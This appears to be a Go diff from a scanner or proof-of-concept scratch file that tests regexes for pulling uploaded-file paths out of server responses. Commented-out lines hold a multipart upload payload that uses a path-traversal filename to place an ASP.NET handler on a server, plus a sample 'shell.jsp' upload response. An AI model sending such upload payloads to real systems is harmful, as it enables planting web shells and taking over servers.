@@ -17,81 +17,81 @@ func main() {
 	// 	fmt.Println(string(b))
 	// 	return
 	// }
-	body := `--2ac719f8e29343df94aa4ab49e456061
-Content-Disposition: form-data; name="dbId_v"
+	// 	body := `--2ac719f8e29343df94aa4ab49e456061
+	// Content-Disposition: form-data; name="dbId_v"
 
-.
---2ac719f8e29343df94aa4ab49e456061
-Content-Disposition: form-data; name="FID"
+	// .
+	// --2ac719f8e29343df94aa4ab49e456061
+	// Content-Disposition: form-data; name="FID"
 
-2022
---2ac719f8e29343df94aa4ab49e456061
-Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.ashx."
-Content-Type: text/plain
+	// 2022
+	// --2ac719f8e29343df94aa4ab49e456061
+	// Content-Disposition: form-data; name="FAtt"; filename="../../../../uploadfiles/test.ashx."
+	// Content-Type: text/plain
 
-<%@ WebHandler Language="C#" Class="TestHandler" %>
-		using System;
-		using System.Web;
-		public class TestHandler : IHttpHandler {
-			public void
-			ProcessRequest (HttpContext context) {
-				context.Response.ContentType= "text/plain";
-				context.Response.Write("Test");
-			}
-			public bool IsReusable {
-				get {return false; }
-			}
-		}
---2ac719f8e29343df94aa4ab49e456061--
-	`
-	body = strings.ReplaceAll(body, `"`, `\"`)
-	body = strings.Replace(body, "\n", "\\r\\n\\\n", -1)
-	fmt.Println(body)
+	// <%@ WebHandler Language="C#" Class="TestHandler" %>
+	// 		using System;
+	// 		using System.Web;
+	// 		public class TestHandler : IHttpHandler {
+	// 			public void
+	// 			ProcessRequest (HttpContext context) {
+	// 				context.Response.ContentType= "text/plain";
+	// 				context.Response.Write("Test");
+	// 			}
+	// 			public bool IsReusable {
+	// 				get {return false; }
+	// 			}
+	// 		}
+	// --2ac719f8e29343df94aa4ab49e456061--
+	// 	`
+	// 	body = strings.ReplaceAll(body, `"`, `\"`)
+	// 	body = strings.Replace(body, "\n", "\\r\\n\\\n", -1)
+	// 	fmt.Println(body)
 
-	return
-	v2 := `
-	<SCRIPT LANGUAGE="JavaScript">
-    <!--
-        alert("附件上传成功");
-	  //alert("附件上传成功");
+	// 	return
+	// v2 := `
+	// <SCRIPT LANGUAGE="JavaScript">
+	// <!--
+	//     alert("附件上传成功");
+	//   //alert("附件上传成功");
 
-	    window.opener.parent.document.all.infoPicSaveName.value+=";"+"2023042410151315678066363.jsp"+";";
-		window.opener.parent.document.all.infoPicName.value+=";"+"shell.jsp"+";";
+	//     window.opener.parent.document.all.infoPicSaveName.value+=";"+"2023042410151315678066363.jsp"+";";
+	// 	window.opener.parent.document.all.infoPicName.value+=";"+"shell.jsp"+";";
 
-		window.opener.parent.document.all.infoPicName.height=parseInt(window.opener.parent.document.all.infoPicName.height)+25;
-		//alert(window.opener.parent.document.all..height);
-        
+	// 	window.opener.parent.document.all.infoPicName.height=parseInt(window.opener.parent.document.all.infoPicName.height)+25;
+	// 	//alert(window.opener.parent.document.all..height);
 
-		//在调用页面的table列表中显示
-        var path="information";
-        var parentTable="infoPicTable";
-        var fileNames="infoPicName";
-        var saveNames="infoPicSaveName";
-        var fileNum="0";
-        var fileNameTemp="shell.jsp";
+	// 	//在调用页面的table列表中显示
+	//     var path="information";
+	//     var parentTable="infoPicTable";
+	//     var fileNames="infoPicName";
+	//     var saveNames="infoPicSaveName";
+	//     var fileNum="0";
+	//     var fileNameTemp="shell.jsp";
 
-        var obj=eval("opener.window.document.all."+parentTable);
+	//     var obj=eval("opener.window.document.all."+parentTable);
 
-        obj.insertRow();
-        var rowNum=obj.rows.length-1;
-        var newNode=obj.rows(rowNum);
-        newNode.bgColor="#FFFFFF";
-        newNode.id="newInsertedTrid";
-        for(var i=0;i<2;i++){
-            newNode.insertCell();
-		`
+	//     obj.insertRow();
+	//     var rowNum=obj.rows.length-1;
+	//     var newNode=obj.rows(rowNum);
+	//     newNode.bgColor="#FFFFFF";
+	//     newNode.id="newInsertedTrid";
+	//     for(var i=0;i<2;i++){
+	//         newNode.insertCell();
+	// 	`
+	v2 := "Location: ./zipkin/ xxxx"
 
-	v11 := ".*infoPicSaveName\\.value\\+=\";\"\\+\"(\\d+)\\.jsp\".*"
-	re2 := regexp2.MustCompile(string(v11), 0)
+	// v11 := ".*infoPicSaveName\\.value\\+=\";\"\\+\"(\\d+)\\.jsp\".*"
+	// re2 := regexp2.MustCompile(string(v11), 0)
 
-	isMatch, err := re2.MatchString(string([]byte(v2)))
-	if err != nil {
-		fmt.Println(err.Error())
-	} else {
-		fmt.Println(isMatch)
-	}
+	// isMatch, err := re2.MatchString(string([]byte(v2)))
+	// if err != nil {
+	// 	fmt.Println(err.Error())
+	// } else {
+	// 	fmt.Println(isMatch)
+	// }
 
-	v1 := ".*infoPicSaveName\\.value\\+=\";\"\\+\"(?P<path>.+?)\\.jsp\".*"
+	v1 := "Location: \\./(?P<path>.+?)/"
 	resultMap := make(map[string]string)
 	re := regexp2.MustCompile(string(v1), regexp2.RE2)
 	if m, _ := re.FindStringMatch(string([]byte(v2))); m != nil {
